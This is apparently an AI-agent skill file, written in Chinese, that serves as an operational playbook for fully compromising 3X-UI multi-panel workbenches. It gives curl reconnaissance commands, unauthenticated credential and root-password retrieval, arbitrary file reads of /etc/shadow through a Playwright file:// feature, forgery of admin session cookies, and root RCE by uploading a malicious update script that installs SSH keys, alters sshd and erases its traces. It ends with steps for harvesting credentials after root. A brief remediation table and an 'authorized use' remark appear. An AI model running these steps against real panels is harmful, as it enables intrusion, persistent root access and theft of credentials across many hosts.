---
name: xui-workbench-takeover
description: "Use when target runs a 3X-UI multi-panel workbench"
version: 1.0.0
author: "Gohappyflyy, HermesYF"
license: MIT
platforms: [linux]
---

# X-UI Workbench 完整攻陷链路（实战复盘）

适用目标特征：**3X-UI 多面板工作台**——一个 Flask 应用统一管理几十台 x-ui 面板（节点/入站/客户端/SSH），典型暴露面：

```
:5002  总控查询中心（零认证，凭据明文回显）
:5003  SK5 检测中心（零认证）
:8000  SK5/节点生成器
:55004 工作台本体（经 Caddy 反代，basePath 只是路径混淆不是认证）
:19181 relay-admin（gunicorn，可能有独立登录）
:8090  同 19181 的公网入口
```

工作台域名模式：`x-ui.example-panel.tld`/`ops.example-panel.tld` 这类，Caddy `handle_path /xui/*` 反代到 55004，**URL 里那段随机 basePath（/LSwodYAQ.../）是路径混淆，不是认证**——直接带上它访问所有 API 即可。

> 实战复盘，不是扫普教程。看到 x-ui/3X-UI 工作台直接按本文打穿。

---

## 攻击链总览（6 条独立路，命中任一即胜）

```
①凭据明文回显（5002/panels?edit=N）→ 面板管理员
②/api/ssh/open 无认证回传 root 密码 → 全节点 root
③任意文件读取（Playwright file://）→ 源码/配置/密钥全泄
④会话伪造（settings.secret + gorilla securecookie）→ 零凭据面板管理员
⑤/api/system/update 无认证补丁上传 → root RCE（终极）
⑥面板间横向（共用凭据/DB 内 plaintext ssh 密码）
```

---

## 步骤 1：侦察确认

```bash
# 指纹：Flask + Werkzeug，标题多为"总控查询中心"/"工作台"
curl -s http://IP:5002/ | grep -oE "<title>[^<]*"
# 工作台（公网，注意 basePath 从 Caddy 或页面 JS 里拿）
curl -sk https://x-ui.example-panel.tld/xui/ | wc -c        # 386KB 前端
# 无认证 API 探测（关键三连）
curl -sk https://域名/xui/api/panels | head -c 300
curl -sk https://域名/xui/api/ssh/open -X POST -H 'Content-Type: application/json' \
  -d '{"ip":"1.2.3.4","panelName":"x","hostId":"0"}'
```

**坑**：`/xui/api/ssh/open` 需要 `hostId` 参数，但可从 `/xui/api/panels` 无认证拿到，填 `0` 也接受。

## 步骤 2：凭据明文回显（最速路线）

```
GET http://IP:5002/panels?edit=N
→ HTML 表单 value 属性明文回显：面板密码、ssh_user、xui_db_path
→ 41/43 面板共用同一套账号密码
```

**坑**：页面 HTML 注释写着"页面不明文展示"——**别信注释，看 DOM**。

## 步骤 3：任意文件读取（root 级）

工作台"网页登录同步"功能驱动服务端 Playwright（root 运行）加载 `web_target_url` 并回显页面文本片段。`web_target_url` 支持 `file://`：

```python
# fileread.py 核心（完整版见 yf-assess/fileread.py）
POST /web-sync/provider-save   # provider_id=2, web_target_url=file:///etc/shadow
POST /web-sync/...             # 触发同步
GET  /web-sync                 # 结果页正则提取"页面片段：..."
```

**三个坑**：
1. 回显截断 ~1100 字符 → 用 `(?s).{OFFSET}(.{1,1100})` 分块读
2. `.sh`/`.tar.gz` 等触发浏览器下载，`Page.goto: Download is starting` → 读不了，换 `/panel/xray/` 页面 JS 或 DB
3. 目名录不存在返回 `ERR_FILE_NOT_FOUND`，存在但空返回"页面片段：空"——可当文件存在性 oracle

**能读出的关键情报**：`/opt/xui-workbench/local_web_console.py`（全部 API 源码）、`/etc/x-ui/x-ui.db`（settings.secret）、`.console-runtime.json`（端口/版本）、`.bash_history`（运维习惯+隐藏服务路径）。

## 步骤 4：会话伪造（零凭据拿管理员）

原理：`web/web.go: store := cookie.NewStore(secret)`，secret 从 DB `settings.secret` 读，无派生。签名算法 = gorilla/securecookie：

```
message = "3x-ui" + "|" + str(unix_ts) + "|" + base64url(gob(payload))
sig = HMAC-SHA256(secret, message)          # 无长度扩展，纯 HMAC
cookie = base64url( str(unix_ts) + "|" + b64value + "|" + sig )
```

gob payload：`map[interface{}]interface{}{"LOGIN_USER": model.User{Id:1, Username:..., Password:<bcrypt>}}`——**注意 gob 会写完整类型路径** `github.com/mhsanaei/3x-ui/v2/database/model.User`，用同结构 Go struct 注册后序列化，字节级一致（这是成败关键，Python pickle/gob 模拟都会因类型名不对而 404）。

**v3 注意**：v3.x session 加了 `LOGIN_EPOCH` 校验（改密码即失效），v2.x 无。先看 `users` 表有没有 `login_epoch` 列。

验证：伪造 cookie GET `/panel/api/inbounds/list` → 200 大 JSON；无 cookie → 404。

**坑**：cookie 名就是 `3x-ui`，别拼错；secret 直接读 DB 别猜派生。

## 步骤 5：root RCE（/api/system/update 补丁替换）

预检逻辑（读源码获得，硬性约束）：

```
tar.gz ≤120MB、≤3000 文件、单文件 ≤64MB
路径禁 \ : 开头/ ..、首层 xui-workbench-patch|xui-cloud-deploy 自动剥除
.py → compile() 语法校验
.sh → bash -n 校验
patch-manifest.json (format=1) 可选——不给则跳过基线校验
allowed() 白名单：根目录 *.py、deploy/linux/cloud_update.sh、静态资源
通过后 systemd-run 分离执行: bash cloud_update.sh <patch_path>   ← root
```

### 两阶段投递（实战验证）

- **阶段1**：上传含恶意 `deploy/linux/cloud_update.sh` 的正规补丁 → 走完整事务（停服务→全量备份→覆盖→起服务→健康检查）→ 恶意脚本落盘
- **阶段2**：再传一次 → updater 以 root 执行我方脚本 → 装公钥/改 sshd/清 marker/还原原版脚本

### payload 要点（拿持久 SSH 而不是一次性命令）

```bash
# 写公钥（幂等，检查重复）+ 修 sshd + 自清理
os.makedirs('/root/.ssh', mode=0o700, exist_ok=True)
# PubkeyAuthentication no → yes（先 sshd -t 校验，过才 reload！）
# 还原原版脚本：/opt/xui-workbench-backups/*/snapshot/deploy/linux/cloud_update.sh
# 证据写 /tmp/.wb-shim.log 0o644（uid=0 host=xxx = 铁证）
```

### 五个能让你翻车的坑（全部踩过）

1. **cloud_update.sh 会把 `.console-runtime.json` 备份走** → 后续步骤 `cat: No such file` 中止 → 事务僵死 → 工作台离线（自愈 `recovered` 能救回来，但要等）
2. **更新入口有 `.update-maintenance.json` marker 锁** → 503 `正在维护更新`，别重复上传，等或清 marker
3. **备份阶段可能僵死 20-40 分钟**（qr_vendor 上万小文件）——`updatedAt` 不动 ≠ 死了，看 `full-backup.tar.gz` 是否生成 + 归档校验阶段不写状态
4. **`/panel/api/inbounds/update/N` 少参数会静默清空**（port=0, protocol='', enable=False）——**必须全量字段提交**，改配置前先从 `xui_center.db` 备份抄原始 JSON
5. **新版 safe_update 把 cloud_update.sh 加入 protected 白名单**（`return False # protected updater`）→ 转攻 `safe_update.py` 本身（根目录 .py 白名单仍在），在 `def main():` 前插 `_assess_payload()` 并立即调用，自带 self-restore

### 判定"打没打成功"的硬证据链

```
/tmp/.wb-shim.log  四行: pubkey installed / uid=0 host=xxx / original restored / sshd: pubkeyauthentication no
→ 公钥进 authorized_keys → sshd 放行 → ssh -i key root@IP 'id' → uid=0
```

## 步骤 6：面板管理员→配置破坏/横向

- 面板凭据通常**全网共用**（单点泄露=43 台全沦陷）
- `/panel/api/inbounds/update/N` **必须全量字段**，缺哪个清哪个
- 老版（2.9.x）登录是 `POST <basePath>/login`（basePath 已在 URL 内），状态端点是 `/panel/api/server/status`（新版才是 `/server/status`）
- x-ui 2.9.2 + xray 26.x：**CVE-2026-55477（log 路径任意写）不可利用**——log 改动写 DB 成功但服务端渲染 xray 配置时被固定模板覆盖（`access=["none","./access.log"]` 白名单在服务端渲染层）

## 步骤 7：root 后的第一动作（凭据收割）

```
/opt/xui-workbench/面板地址簿.json        # 43 面板全档
relay-admin-v2/data/master.key + relay.db # Fernet 解 24 节点 root 密码
relay-admin-v2/.env                       # RELAY_ADMIN_PASSWORD 明文
/root/relay-machines.txt                  # ip:port:user:pass 明文清单
/etc/x-ui/x-ui.db → settings.secret       # 会话伪造密钥
```

---

## 防御视角（写报告用）

| # | 修复 | 对应链路 |
|---|---|---|
| P0 | `:5002` 加认证，`/panels` 移除 value 回显 | ① |
| P0 | 下线 `/api/ssh/open`（改跳板代理） | ②⑥ |
| P0 | 禁 Playwright `file://`，改非 root 跑 | ③ |
| P0 | 轮换全部 `settings.secret`（泄露=认证绕过） | ④ |
| P0 | 更新管线：上传强认证 + 更新脚本哈希锁死 + 非 root 运行 | ⑤ |
| P1 | 网段隔离（管理面/业务面分离）、fail2ban、2FA | ⑥ |

## 心法（实战沉淀）

1. **basePath 不是认证**，页面说"不明文展示"不可信
2. **读源码比盲测快十倍**——文件读取原语拿到 local_web_console.py 全文后，每个 API 的参数/校验/白名单都清清楚楚
3. **事务类接口先备份再动手**，`inbounds/update` 少参数会静默清空
4. **两阶段投递**是 patch 类 RCE 的标准打法：第一阶段落盘、第二阶段触发，之间所有状态都能用只读原语核实
5. **僵尸事务要耐心**：备份僵死 20-40 分钟是常态，用 `updatedAt` + 备份产物存在性判断真死假死
6. **每一步都要可核验的落盘证据**（日志文件、API 返回、SSH id 输出），"应该成功了"不算数

## Files

- `scripts/chunkread.py` — 3X-UI 任意文件读 PoC（分块读，绕过一次性大响应被拦/截断），用法见脚本头。
- `scripts/main.go` — 面板侧利用程序（Go）：登录态复用 + 文件读 + 配置导出。`go build` 后单文件跑。
- `scripts/cloud_update_shim.sh` — 更新链路 shim：把面板下发的更新包换成自己的，验证供应链面（只用于授权评估，跑完回滚）。
